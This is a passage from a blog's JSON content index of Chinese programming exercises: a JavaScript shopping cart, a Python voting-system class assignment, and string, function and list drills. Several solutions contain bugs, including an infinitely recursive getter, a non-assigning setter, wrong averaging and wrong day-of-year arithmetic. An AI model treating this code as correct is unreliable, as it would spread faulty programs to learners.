onclick=&quot;delete1(this)&quot;&gt;删除&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td colspan=&quot;5&quot;&gt; &lt;div id=&quot;foot&quot;&gt; &lt;label&gt;&lt;input type=&quot;checkbox&quot; class=&quot;check-box&quot; onclick=&quot;check_all(this)&quot;&gt; 全选&lt;/label&gt; &lt;a id=&quot;deleteAll&quot; href=&quot;javascript:void(0)&quot; onclick=&quot;delete_all()&quot;&gt;删除&lt;/a&gt; &lt;/div&gt; &lt;div id=&quot;selected&quot;&gt;已选商品&lt;span id=&quot;selectedTotal&quot;&gt;0&lt;/span&gt;件&lt;span id=&quot;hidden&quot;&gt;︽&lt;/span&gt;&lt;/div&gt; &lt;div&gt;合计：￥&lt;span id=&quot;priceTotal&quot;&gt;0&lt;/span&gt;&lt;/div&gt; &lt;/td&gt; &lt;td&gt; &lt;div onclick=&quot;getTotal();&quot;&gt;结 算&lt;/div&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/div&gt;&lt;script src=&quot;my_js.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; CSS代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364table &#123; margin: 0 auto; border: 1px #CADEFF solid; text-align: center; border-spacing: 0;&#125;a &#123; color: #666; text-decoration: none;&#125;th &#123; background: #e2f2ff;&#125;td &#123; text-align: center; padding: 10px; color: #444;&#125;#box table th, #box table td &#123; border: 1px solid #CADEFF; border-spacing: 0;&#125;.goods span &#123; width: 180px; margin-top: 30px; text-align: left; float: left;&#125;img &#123; width: 100px; height: 80px; margin-right: 10px; float: left;&#125;#foot &#123; float: left; margin-right: 300px;&#125;#selected &#123; float: left;&#125;.count .add, .count .reduce &#123; height: 25px; width: 17px; background: #f0f0f0; text-align: center; line-height: 25px; color: #444;&#125;.count input &#123; height: 25px; line-height: 25px; border: 1px solid #aaa; color: #343434; text-align: center; background-color: #fff;&#125;.price &#123; width: 130px;&#125;.count &#123; width: 90px;&#125; JS代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778//数量点击减少事件function reduce(th) &#123; var reduce1 = Number(th.nextElementSibling.value); //获取数量 var element = th.nextElementSibling; //获取减少框的兄弟标签数量框 var reduce2 = reduce1 - 1; //点击事件时,数量减一 element.value = reduce2; //赋值操作 if (reduce2 === 0) &#123; //数量不能为0 th.disabled = true //禁用属性,停止使用 &#125; var price = th.parentNode.previousElementSibling.textContent ;//获取单价 var subtotal = th.parentNode.nextElementSibling; // 获取小计 var subtotal1 = Number(price) * Number(element.value); //计算小计 ,转换为number属性,原属性为string subtotal.textContent = subtotal1.toFixed(2); //toFixed保留小数 getP() //调用合计方法&#125;//添加商品function add(th) &#123; th.previousElementSibling.previousElementSibling.disabled = false; //重置disabled属性 var add1 = Number(th.previousElementSibling.value); var element = th.previousElementSibling; var add2 = add1 + 1; element.value = add2; var price = th.parentNode.previousElementSibling.textContent; var subtatal = th.parentNode.nextElementSibling; var subtatal1 = Number(price) * Number(element.value); subtatal.textContent = subtatal1.toFixed(2); getP()&#125;//删除商品function delete1(th) &#123; th.parentNode.parentNode.remove(); getP()&#125;//点击事件function check(th) &#123; getP();&#125;var checked = document.getElementsByClassName(&quot;checkbox&quot;);//获取所有的checkbox类的列表//选择商品删除function delete_all(th) &#123; for (var i = checked.length - 1; i &gt;= 0; i--) &#123; //长度 1开始,下标0开始 反向遍历, 正向删除,下标会变化 if (checked[i].checked) &#123; checked[i].parentNode.parentNode.remove(); &#125; &#125; getP()&#125;//全选或不选function check_all(th) &#123; // console.log(checked); var check1 = th.checked; var check2 = document.getElementsByClassName(&quot;check-box&quot;); for (var i = 0; i &lt; checked.length; i++) &#123; checked[i].checked = th.checked; &#125; check2[0].checked = check1; check2[1].checked = check1; getP()&#125;//合计和已选商品function getP() &#123; var selected = document.getElementById(&quot;selectedTotal&quot;); //已选择的物品件数 var priceTotal = document.getElementById(&quot;priceTotal&quot;); //已选择的物品总价格 var subtotal = document.getElementsByClassName(&quot;subtotal&quot;); //获取小计的数组 var count = document.getElementsByClassName(&quot;count-input&quot;); //获取所有的物品数量数组 var selected1 = 0; var priceTotal1 = 0; for (var j = 0; j &lt; checked.length; j++) &#123; if (checked[j].checked) &#123; selected1 += Number(count[j].value); priceTotal1 += Number(subtotal[j].textContent); &#125; &#125; selected.textContent = selected1; priceTotal.textContent = priceTotal1.toFixed(2);&#125;","categories":[],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"Python面试题","slug":"Python--投票系统","date":"2020-07-27T13:22:37.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/07/27/Python--投票系统/","permalink":"http://example.com/2020/07/27/Python--%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F/","excerpt":"你将设计一个投票系统，选举出政党的候选人。 有一个候选人的名单，投票人将从中选出一个候选人作为领导。 选举规则如下： 每个投票人只能投票一次。投票人通过产生一个随机数，来决定选择哪个候 选人，该随机数处于1和候选人总数之间。 每个候选人都拥有一个记录（集合），记录着哪些投票人投了他的票。 选举结束后，票数最高的候选人当选。","text":"你将设计一个投票系统，选举出政党的候选人。 有一个候选人的名单，投票人将从中选出一个候选人作为领导。 选举规则如下： 每个投票人只能投票一次。投票人通过产生一个随机数，来决定选择哪个候 选人，该随机数处于1和候选人总数之间。 每个候选人都拥有一个记录（集合），记录着哪些投票人投了他的票。 选举结束后，票数最高的候选人当选。 投票系统一、概述You are tasked to implement a voting system for electing a leader of a political party. The process is as follows: 你将设计一个投票系统，选举出政党的候选人。 The party has a list of candidates（候选人） and the voter（投票人） attempt to elect one of the candidates as leader. 有一个候选人的名单，投票人将从中选出一个候选人作为领导。 The voting rules are as follows: 选举规则如下： Each voter can vote only once. The voter decides which candidate to choose by generating a random number between 1 and the total number of candidates. 每个投票人只能投票一次。投票人通过产生一个随机数，来决定选择哪个候 选人，该随机数处于1和候选人总数之间。 Each candidate maintains a record of the voters that voted for him 每个候选人都拥有一个记录（集合），记录着哪些投票人投了他的票。 After election, the candidate with the highest number of votes is elected 选举结束后，票数最高的候选人当选。 二、Program Deign: 程序设计Part 1: 第一部分Design a Person class which includes the following 设计一个Person类 1.1 实例属性和类属性 ​ __name: contains the name of the person 名字。 ​ __age: the age of the person 年龄 ​ __sex：性别 ​ __salary: the persons salary (a real number) 薪水（实数） ​ __birthday: 生日 类型应该为datetime **__id**: the id of the person. A person id cannot be changed intentionally or unintentionally by any method (current or future). It is assigned by the program at creation time and it reflects the order in which the record was created. Namely, the first person’s id is 1; the second person’s id is 2 and so on. Person的id，id不能被任何函数修改，创建Person对象时被赋值，并且反映 创建的顺序。第1个Person的id是1，第2个Person的id是2，依此类推。 ​ __totalPersons: a static variable that maintains the total persons Person的总数，一个类属性 1.2 方法 ​ a constructor __ init_ _(self,name:str,age:int,sex:bool,salary:float,year:int,month:int,day:int)&#x2F;&#x2F;Q：构造函数的参数为何没有id？ ​ 其它方法参考《人员信息管理系统》 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273# _*_coding:UTF-8 _*_from datetime import dateclass Person(object): __totalPersons = 0 # 总人数 # def __init__(self, name, age, salary, year, month, day): # Person.totalPersons += 1 # self.__name = name # self.__age = age # self.__salary = salary # self.__birthday = date(year, month, day) def __init__(self, name: str, age: int, sex: bool, salary: float, year: int, month: int, day: int): self.__sex = sex self.__age = age self.__name = name self.__salary = salary self.__birthday = date(year, month, day) Person.__totalPersons += 1 self.__id = self.__totalPersons def get_age(self): return self.__age def get_name(self): return self.__name def get_sex(self): return self.get_sex() def get_birthday(self): return self.__birthday def get_salary(self): return self.__salary def set_sex(self, sex): self.__sex = sex def set_name(self, name): self.__name = name def set_age(self, age): self.__age = age def set_salary(self, salary): self.__salary = salary def set_birthday(self, y, m, d): self.__birthday + date(y, m, d) # def __str__(self): # return &quot;姓名:%s,年龄:%d,薪资:%d&quot; % (self.__name, self.__age, self.__salary) def get_toal_persons(self): return self.__totalPersons def __str__(self): return &quot;姓名:%s,年龄:%s,性别%s,日期:%s&quot; % (self.__name, self.__age, self.__sex, self.__birthday) def output(self): print(self)if __name__ == &#x27;__main__&#x27;: p1 = Person(&quot;John&quot;, 20, 6000, 2020, 1, 1) p2 = Person(&quot;John&quot;, 20, 6000, 2020, 1, 1) print(p1) print(type(p2)) Part 2: 第二部分Design a Voter class that will inherit from the Person class and will have the following fields: 设计一个Voter（投票人）类，继承自Person类。 2.1 实例属性和类属性 ​ __polingStation:：the number of the poling station that the voter needs to go and register ​ 投票人要去的投票站的id ​ __totalNumVoters： a static variable that contains the total number of voters that each candidate has. ​ 选民总人数 2.2 方法 the method def SelectCadidate(self,candidates:PersonList ) : randomly select a candidate 选择候选人，参数是候选人集合，随机选择一个候选人并返回。 the method Vote(self, aCandidate:Candidate ): vote a candidate 投票函数，选出候选人之后，把当前的投票人对象，加入到该候选人的投票 人集合里。 12def Vote(self,aCandidate:Candidate): aCandidate.addVoter(self) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from person import Personfrom personlist import PersonListfrom candidate import Candidateimport randomclass Voter(Person): __totalNumVoters = 0 # id 和 Voter总人数 # def __init__(self, name, age, salary, year, month, day): # Person.__init__(self, name, age, salary, year, month, day) # Voter.totalNumVoters += 1 # self.__polingStation = polingStation # self.__id = Voter.totalNumVoters def __init__(self, polingStation, *args, **kwargs): self.__flag = False # 标识投票状态 self.__polingStation = polingStation Voter.__totalNumVoters += 1 super().__init__(*args, **kwargs) def select_cadidate(self, candidates: PersonList): # p = random.randint(1, candidates.size()) # 选中的候选者的id # # for candidate in candidates: # if p == candidate.get_id(): # 选中id == 候选者id # return candidate # index = random.randint(0,len(candidates)) # return candidates[index] # random.choice随机选出候选者对象 return random.choice(candidates) # def get_age(self): # return self.__age # # def get_salary(self): # return self.__salary def vote(self, aCandiate: PersonList): # aCandiate.get_voterList().add(self) # 使用候选者的voterlist存放投票者对象 # 限制每个人的投票次数 if self.__flag: # flag 为flase print(&quot;已经投票,请不要重复投票&quot;) else: # 随机选出,将自己添加给候选者 aCandiate.add_voter(self) self.__flag = True print(&quot;投票成功&quot;) def get_total_voters(self): return self.totalNumVoters def resert_vote(self): # 重置投票状态 self.__flag = False Part 3: 第三部分 Design a Candidate class that will inherit from Person class and will have the following: 候选人类，继承自Person类 3.1 实例属性和类属性 ​ __voterList: the voterList contains all the voters that voted for the candidate. The set should not be limited in size. Use the container class PersonSet that you implemented in assignment ​ 容器类，包含所有投票给该候选人的投票人，容器的尺寸没有限制，使用作 业1中完成的PersonList类。 ​ __numCandidates: a static variable that contains the total number of candidates which are still in the race for the leadership ​ 候选人总数。 3.2 方法 a method that returns the number of votes that the candidate received: getVotesNum() return the number of voters 返回候选人得到的选票数 getAverageVotersAge(): prints the average age of the voters that voted for the candidate 打印投票给该候选人的投票人的平均年龄 GetAverageVotersSalary(): prints the average salary of the voters that voted for the candidate 打印投票给该候选人的投票人的平均薪水。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from person import Personfrom personlist import PersonListclass Candidate(Person): __numCandidates = 0 # 候选者id 和 候选者总人数 # def __init__(self, name, age, salary, year, month, day): # Candidate.numCandidates += 1 # Person.__init__(self, name, age, salary, year, month, day) # self.__name = name # self.__id = Candidate.numCandidates # self.__voterList = PersonList() # voterlist对象 def __init__(self, *args, **kwargs): # 创建一个容器，用于记录谁给参选者投了票 self.__voterList = PersonList() super().__init__(*args, **kwargs) Candidate.__numCandidates += 1 # def output(self): # print(&#x27;候选人:&#x27;, self, &#x27;id:&#x27;, self.__id) def get_voterList(self): # 获取私有属性voterList 用于存放选择候选者的支持者 return self.__voterList # def get_id(self): # 获取私有属性 候选者的id # return self.__id # # def get_name(self): # return self.__name def add_voter(self, voter): # 添加投票人 self.__voterList.add(voter) def show_voters(self): # 展示候选者的支持人信息 print(self.__voterList) def get_voter_number(self): # 获取的票数量 return self.__voterList.size() # return len(self.__voterLisrt) def get_average_voter_age(self): sum = 0 for i in self.get_voterList(): sum += i.get_age() if self.get_voter_number(): return sum / self.get_voter_number() return 0 def get_average_voter_slary(self): sum = 0 for i in self.get_voterList(): sum += i.get_salary() if self.get_voter_number(): return sum / self.get_voter_number() return 0 def reset_voters(self): for i in range(self.__voterList.size()): # 进行二次投票,清空支持候选者的列表 self.__voterList.pop() Part 5: 第四部分PersonList类 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from person import Personclass PersonList: def __init__(self): self.__list = [] self.__index = 0 self.__index1 = 0 def __len__(self): # 默认覆盖len方法 return len(self.__list) def __getitem__(self, index): return self.__list[index] def add(self, person: Person): # 添加person self.__list.append(person) def size(self): # 容器中的元素个数 return len(self.__list) def remove(self, person): self.__list.remove(person) def pop(self, index=None): if not index: return self.__list.pop() return self.__list.pop(index) # def output(self): # 输出打印容器中的所有的person对象 # for p in self.__list: # p.output() def reset(self): self.__index1 = -1 # 重置index def next_element(self): # 负责循环迭代 if self.__index1 &gt;= self.size(): self.__index = -1 self.__index += 1 return self.__list[self.__index1] def __iter__(self): self.__index = 0 # 重置下标 return self def __next__(self): if self.__index &lt; len(self.__list): item = self.__list[self.__index] self.__index += 1 return item else: raise StopIteration def __str__(self): string = &quot;&quot; for p in self.__list: string += p.__str__() + &#x27;\\n&#x27; return stringif __name__ == &#x27;__main__&#x27;: p1 = Person(&quot;John&quot;, 20, 6000, 2020, 1, 1) p2 = Person(&quot;John&quot;, 20, 6000, 2020, 1, 1) pl = PersonList() pl.add(p1) pl.add(p2) print(pl) # pl.output() for i in pl: print(i) Part 5: 第五部分测试代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768# _*_coding:UTF-8 _*_from personlist import PersonListfrom candidate import Candidatefrom voter import Votercounter = 1 # 计数,第几次投票def start_voting(voters, candidates): global counter print(f&quot;...........................第&#123;counter&#125;次投票...........................&quot;) counter += 1 for c in candidates: # 遍历候选人的容器 c.reset_voters() # 清理容器 for voter in voters: voter.resert_vote() # 让每个投票人随即投票并添加到候选者的列表 for voter in voters: c = voter.select_cadidate(candidates) voter.vote(c) #进行投票操作 # 显示每个候选者人对应的投票人 for can in candidates: print(&quot;投票给[%s]的人you:&quot;%can.get_name()) can.show_voters() #判断 maxCan = candidates[0] for i in range(1,len(candidates)): if candidates[i].get_voter_number()&gt;maxCan.get_voter_number(): maxCan = candidates[i] # 定义新容器存放,新一轮的候选者 newCandidates =PersonList() for can in candidates: if maxCan.get_voter_number()==can.get_voter_number(): newCandidates.add(can) if newCandidates.size()&gt;=2: start_voting(voters,newCandidates) else: print(&quot;最高票数的人是:%s,得票数为:%d&quot;%(maxCan.get_name(),maxCan.get_voter_number())) print((f&quot;支持这的平均年龄&#123;maxCan.get_average_voter_age()&#125;,平均薪水为:&#123;maxCan.get_average_voter_slary()&#125;&quot;))def main(): # 创建投票者队伍 voters = PersonList() # 创建参选者队伍 candidates = PersonList() # 此处考察面向对象的创建和使用 # 添加3个参选人： candidates.add(Candidate(sex=True, age=18, name=&#x27;Tom&#x27;, salary=4654, year=2001, month=5, day=3)) candidates.add(Candidate(sex=True, age=19, name=&#x27;Jack&#x27;, salary=4654, year=2001, month=5, day=3)) candidates.add(Candidate(sex=True, age=20, name=&#x27;Linda&#x27;, salary=4654, year=2001, month=5, day=3)) # 添加5个投票者 voters.add(Voter(polingStation=&quot;NewYork1&quot;, sex=True, age=20, name=&#x27;zhao1&#x27;, salary=4654, year=2001, month=5, day=3)) voters.add(Voter(polingStation=&quot;NewYork2&quot;, sex=False, age=20, name=&#x27;zhao2&#x27;, salary=4654, year=2001, month=5, day=3)) voters.add(Voter(polingStation=&quot;NewYork3&quot;, sex=False, age=20, name=&#x27;zhao3&#x27;, salary=4654, year=2001, month=5, day=3)) voters.add(Voter(polingStation=&quot;NewYork4&quot;, sex=True, age=20, name=&#x27;zhao4&#x27;, salary=4654, year=2001, month=5, day=3)) voters.add(Voter(polingStation=&quot;NewYork5&quot;, sex=False, age=20, name=&#x27;zhao5&#x27;, salary=4654, year=2001, month=5, day=3)) start_voting(voters,candidates)if __name__ == &#x27;__main__&#x27;: main()","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"Python--字符串练习题","slug":"Python-字符串练习题","date":"2020-07-17T02:42:08.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/07/17/Python-字符串练习题/","permalink":"http://example.com/2020/07/17/Python-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%83%E4%B9%A0%E9%A2%98/","excerpt":"python 1、检测用户输入的话，检测出其中有多少数字，空格，特殊符号，英文 2.敏感字检测 3.随机制作4位验证码，并打印显示 4.密码级别检测的程序","text":"python 1、检测用户输入的话，检测出其中有多少数字，空格，特殊符号，英文 2.敏感字检测 3.随机制作4位验证码，并打印显示 4.密码级别检测的程序 1、检测用户输入的话，检测出其中有多少数字，空格，特殊符号，英文12345678910111213141516# 1. a@3A D4 24@#Dda @32 SdF4@#%2 39# n = [i for i in input(&quot;请输入:&quot;)]# print(n)# english = number = space = others = 0# for i in range(len(n)):# if n[i].isalpha():# english += 1# elif n[i].isnumeric():# number += 1# elif n[i].isspace():# space += 1# else:# otrhers +=1# #others = len(n) - s - number - space# print(&quot;英文&#123;&#125;，数字&#123;&#125;，空格&#123;&#125;，特殊符号&#123;&#125;&quot;.format(english , number, space, others)) 2、接上题：在上题的基础上加入敏感字检测，当检测到用户输入的内容有敏感字，则提示 一次，当用户连续输入三次敏感字，则提示后退出字符检测。1234567891011121314151617181920212223242526# sensitive = [&#x27;卧槽&#x27;, &#x27;擦&#x27;, &#x27;滚&#x27;, &#x27;尼玛&#x27;, &#x27;沙雕&#x27;]# s = 3# while s:# n = [i for i in input(&quot;请输入:&quot;).split(&#x27; &#x27;)]# print(n)# for i in range(len(n)):# if n[i] in sensitive:# print(&quot;内容有敏感词，请重新输入!&quot;)# s -= 1# break# if s == 0:# print(&quot;敏感次数已达三次！！&quot;)## english = number = space = others = 0# for i in range(len(n)):# if n[i].isalpha():# english += 1# elif n[i].isnumeric():# number += 1# elif n[i].isspace():# space += 1# else:# otrhers +=1# #others = len(n) - s - number - space# print(&quot;英文&#123;&#125;，数字&#123;&#125;，空格&#123;&#125;，特殊符号&#123;&#125;&quot;.format(english , number, space, others)) 3、随机制作4位验证码，并打印显示。用户输入正确，则提示正确，退出 程序，否则不停重新生成验证码，重新输入12345678910111213141516171819# import random# s = &#x27;&#x27;# while True:# for i in range(4):# tem = random.randint(0,3)# if tem ==i:# check = chr(random.randint(65,97))# else:# check = random.randint(0,9)# s += str(check)# print(&quot;生成的验证码为：&quot;,s)## n = input(&quot;请输入验证码:&quot;)# if s == n:# print(&quot;输入正确！&quot;)# break# else:# print(&quot;输入错误！请重新输入！！&quot;)# s = &#x27;&#x27; 4、写一个密码级别检测的程序，文件名为check.py‘’’低级密码：由纯字母或纯特殊符号组成，长度低于8位中级密码：由数字，字母或特殊符号两种及以上的任意组合，密码长度为8-15位高级密码：必须由数字，字母和特殊符号三种组合，密码长度不低于16位说明：用户输入密码，会输出验证密码是什么级别的信息。其中密码输入后会额外提示： 当密码为空，提示不能为空 当密码以数字开头，提示不能以数字开头 当密码长度和组合不够高级密码要求，要提示正确的长度及组合‘’’ 12345678910111213141516171819202122232425262728293031# while True:# number = alpha = special = 0# p = input(&quot;请输入密码:&quot;)# if len(p) == 0:# print(&quot;密码不能为空！！&quot;)# if p[0].isnumeric():# print(&#x27;不能以数字开头&#x27;)# for i in p:# if i.isnumeric():# number += 1# elif i.isalpha():# alpha += 1# elif ord(i) &gt;= 33 and ord(i) &lt;= 42:# special += 1## if len(p) &lt; 8:# if alpha == len(p) or special == len(p) or number == len(p):# print(&#x27;低级密码\\n&#x27;, &#x27;密码需包含字母、数字、特殊符号&#x27;)## elif len(p) &lt;= 15:# if number + alpha == len(p) or number + special == len(p) or special + alpha == len(p):# print(&#x27;中级密码&#x27;)# if special == 0:# print(&quot;请添加特殊符号！&quot;)# elif alpha == 0:# print(&#x27;请添加字母！&#x27;)# elif number == 0:# print(&#x27;请添加数字！&#x27;)# elif len(p) &gt;= 16:# if number != 0 and special != 0 and alpha != 0:# print(&quot;高级密码！&quot;)","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"Python--函数练习题","slug":"Python-函数练习题","date":"2020-07-17T02:33:05.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/07/17/Python-函数练习题/","permalink":"http://example.com/2020/07/17/Python-%E5%87%BD%E6%95%B0%E7%BB%83%E4%B9%A0%E9%A2%98/","excerpt":"python 写一个函数，接受一个整数，输出这个整数的所有因子 写一个函数，接受一个整数，输出这个数是几位数 写一个函数，传入两个参数，第一个参数为底数，第二个参数为幂，函数返回底数的幂运算值 写一个函数，计算两点（x1,y1）和（x2,y2）之间的距离 哥德巴赫猜想：任何一个大于6的偶数，都能分解成两个质数的和。要求输出一个整数，输出这个数能被分解成哪两个质数和","text":"python 写一个函数，接受一个整数，输出这个整数的所有因子 写一个函数，接受一个整数，输出这个数是几位数 写一个函数，传入两个参数，第一个参数为底数，第二个参数为幂，函数返回底数的幂运算值 写一个函数，计算两点（x1,y1）和（x2,y2）之间的距离 哥德巴赫猜想：任何一个大于6的偶数，都能分解成两个质数的和。要求输出一个整数，输出这个数能被分解成哪两个质数和 写一个函数，接受一个整数，输出这个整数的所有因子1234567# def get_factor():# n = int(input(&quot;请输入一个整数:&quot;))# for i in range(1,n+1):# if n % i == 0:# print(f&quot;n的因子是&#123;i&#125;&quot;)## get_factor() 写一个函数，接受一个整数，输出这个数是几位数123456# def digit():# n =input(&quot;请输入整数:&quot;)# s= len(n)# print(f&quot;n是&#123;s&#125;位数&quot;)## digit() 1234567891011121314151617写一个函数，传入两个参数，第一个参数为底数，第二个参数为幂，函数返回底数的幂运算值# def power_operation(a,b):# s = a**b# return s## print(power_operation(10,5))写一个函数，计算两点（x1,y1）和（x2,y2）之间的距离# def distance(x, y):# dis = ((b[1] - a[1]) ** 2 + (b[0] - a[0]) ** 2) ** 0.5# return dis### a = [int(i) for i in input(&quot;请输入x坐标:&quot;).split(&#x27;,&#x27;)]# b = [int(i) for i in input(&quot;请输入y坐标:&quot;).split(&#x27;,&#x27;)]# print(a, b)# print(distance(a, b)) 哥德巴赫猜想：任何一个大于6的偶数，都能分解成两个质数的和。要求输出一个整数，输出这个数能被分解成哪两个质数和123456789101112131415161718192021222324252627282930313233343536373839# def resolve():# n = int(input(&quot;请输入大于6的偶数:&quot;))# a = []# for i in range(2, 1000):# for j in range(2, int(i ** 0.5) + 1):# if i % j == 0:# break# else:# a.append(i)# # print(a)## for i in range(len(a)):# if (n - a[i]) in a and a[i]&lt;= n-a[i]:# print(a[i],n-a[i])## resolve()# def is_prim(i):# if i &lt; 2:# return False# for i in range(2, int(n ** 0.5)):# if n % i == 0:# return False# return True## def all_peime():# l = []# for i in range(2, n):# if is_prim(i):# l.append(i)## def print_two(n):# l = all_peime(n)# print(l)# for i in l:# if is_prim(n - i):# print(i, n - i)## print_two(20)","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"Python--列表练习题","slug":"Python-列表练习题","date":"2020-07-12T07:20:17.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/07/12/Python-列表练习题/","permalink":"http://example.com/2020/07/12/Python-%E5%88%97%E8%A1%A8%E7%BB%83%E4%B9%A0%E9%A2%98/","excerpt":"1、输入任意十个数,打印出它们中的最大数、最小数。 2、有一个列表,内放10个整数。要求找出最小的数和它的下标,然后把它和数组中最前面的元素对换位置。 3.青年歌手参加歌曲大奖赛，有10个评委打分，试编程求选手的平均得分（去掉一个最高分和一个最低分）。 4.输入某年某月某日，判断这一天是这一年的第几天？ 5.已知:faibonacci(费波那契)数列的前几个数分别为0，1，1，2，3，5，……。从第3 项开始，每一项都等于前两项的和。读入一个整数n，编程求出此数列的前n 项。– 使用for循环实现 6.从键盘输入一个字符串，判断是否为回文字符串。如’abcba’为回文字符串，即第一个和最后一个相同，第二个和倒数第二个相同，依次类推 7.给你一个整数组成的列表L，按照下列条件输出： 若L是升序排列的,则输出”UP”; 若L是降序排列的,则输出”DOWN”; 若L无序，则输出”WRONG”。 8.十一假期,小P出去爬山,爬山的过程中每隔10米他都会记录当前点的海拔高度(以一个浮点数表示), 这些值序列保存在一个由浮点数组成的列表h中。回到家中，小P想研究一下自己经过了几个山峰，请你帮他计算一下，输出结果。例如：h&#x3D;[0.9,1.2,1.22,1.1,1.6,0.99], 将这些高度顺序连线，会发现有两个山峰，故输出一个2(序列两端不算山峰) 9.约瑟夫问题：有ｎ只猴子，按顺时针方向围成一圈选大王（编号从１到ｎ），从第１号开始报数，一直数到ｍ，数到ｍ的猴子退出圈外，剩下的猴子再接着从1开始报数。就这样，直到圈内只剩下一只猴子时，这个猴子就是猴王，现在给你n和m，请你输出最后猴王的编号。 python列表练习题","text":"1、输入任意十个数,打印出它们中的最大数、最小数。 2、有一个列表,内放10个整数。要求找出最小的数和它的下标,然后把它和数组中最前面的元素对换位置。 3.青年歌手参加歌曲大奖赛，有10个评委打分，试编程求选手的平均得分（去掉一个最高分和一个最低分）。 4.输入某年某月某日，判断这一天是这一年的第几天？ 5.已知:faibonacci(费波那契)数列的前几个数分别为0，1，1，2，3，5，……。从第3 项开始，每一项都等于前两项的和。读入一个整数n，编程求出此数列的前n 项。– 使用for循环实现 6.从键盘输入一个字符串，判断是否为回文字符串。如’abcba’为回文字符串，即第一个和最后一个相同，第二个和倒数第二个相同，依次类推 7.给你一个整数组成的列表L，按照下列条件输出： 若L是升序排列的,则输出”UP”; 若L是降序排列的,则输出”DOWN”; 若L无序，则输出”WRONG”。 8.十一假期,小P出去爬山,爬山的过程中每隔10米他都会记录当前点的海拔高度(以一个浮点数表示), 这些值序列保存在一个由浮点数组成的列表h中。回到家中，小P想研究一下自己经过了几个山峰，请你帮他计算一下，输出结果。例如：h&#x3D;[0.9,1.2,1.22,1.1,1.6,0.99], 将这些高度顺序连线，会发现有两个山峰，故输出一个2(序列两端不算山峰) 9.约瑟夫问题：有ｎ只猴子，按顺时针方向围成一圈选大王（编号从１到ｎ），从第１号开始报数，一直数到ｍ，数到ｍ的猴子退出圈外，剩下的猴子再接着从1开始报数。就这样，直到圈内只剩下一只猴子时，这个猴子就是猴王，现在给你n和m，请你输出最后猴王的编号。 python列表练习题 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140# 1、输入任意十个数,打印出它们中的最大数、最小数。list = [int(i) for i in input(&#x27;请输入十个整数：&#x27;).split(&#x27;,&#x27;)]max=min=list[0]for i in range(10): if list[i]&gt;max: max = list[i] elif list[i]&lt;min: min = list[i]print(max,min)# numbers = []# for i in range(10):# n = int(input(&#x27;请输入第&#x27; + str(i + 1) + &#x27;个数:&#x27;))# numbers.append(n)# if i == 0:# max = min = n# else:# if n &gt; max:# max = n# if n &lt; min:# min = n# # 2、有一个列表,内放10个整数。要求找出最小的数和它的下标,然后把它和数# # 组中最前面的元素对换位置。import randomlist = [random.randint(1,100) for i in range(10)]print(list)min = list[0]a = 0for i in range(10): if min &gt; list[i]: min = list[i] a = ilist[0],list[a] =list[a],list[0]print(list)print(min)print(a)# import random## numbers = []# for i in range(10):# numbers.append(random.randint(0, 100))## print(numbers)# min = numbers[0] # 假设列表中的第0个元素就是最小数# index = 0 # 假设最小数的下标为0## for i in range(len(numbers)):# n = numbers[i]# if min &gt; n:# min = n# index = i## numbers[index],numbers[0] = numbers[0],numbers[index]# print(numbers)# # 3.青年歌手参加歌曲大奖赛，有10个评委打分，试编程求选手的平均得分（去# # 掉一个最高分和一个最低分）。import randomlist = [random.randint(1, 10) for i in range(10)]print(list)max = min = list[0]average = 0sum = 0for i in range(10): if list[i] &gt; max: max = list[i] elif list[i] &lt; min: min = list[i] sum += list[i]average = (sum - max - min) / 10print(sum)print(average)#import random## numbers = []# sum = 0# count = 10# for i in range(count):# n = random.randint(80, 100)# numbers.append(n)# sum += n# print(numbers,sum)## max = min = numbers[0]## for n in numbers:# if n &gt; max :# max = n# if n &lt; min :# min = n## print((sum - min - max)/(count-2))# 4.输入某年某月某日，判断这一天是这一年的第几天？year = int(input(&#x27;请输入年份：&#x27;))mounth = int(input(&#x27;请输入月份：&#x27;))day = int(input(&#x27;请输入天：&#x27;))if mounth == 1: print(day)else: for i in range(1,mounth+1,2): day += 31 for i in range(2,mounth,2): day += 30 print(day)# year = int(input(&#x27;请输入年：&#x27;))# month = int(input(&#x27;请输入月：&#x27;))# day = int(input(&#x27;请输入日：&#x27;))## ds = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]## if (year % 4 == 0 and year % 100 != 0) or year % 400 == 0:# ds[1] = 29## sum = 0# for i in range(month-1):# sum += ds[i]## sum += day## print(str(year)+&#x27;年&#x27;+str(month)+&#x27;月&#x27;+str(day)+&#x27;日是这一年的第&#x27;+str(sum)+&#x27;天&#x27;) # 5、已知:faibonacci(费波那契)数列的前几个数# 分别为0，1，1，2，3，5，......。从第3 项开始，# 每一项都等于前两项的和。读入一个整数n，编程求# 出此数列的前n 项。-- 使用for循环实现n = int(input(&#x27;请输入一个整数：&#x27;))a, b = 0, 1list = [a,b]for i in range(n): a, b = 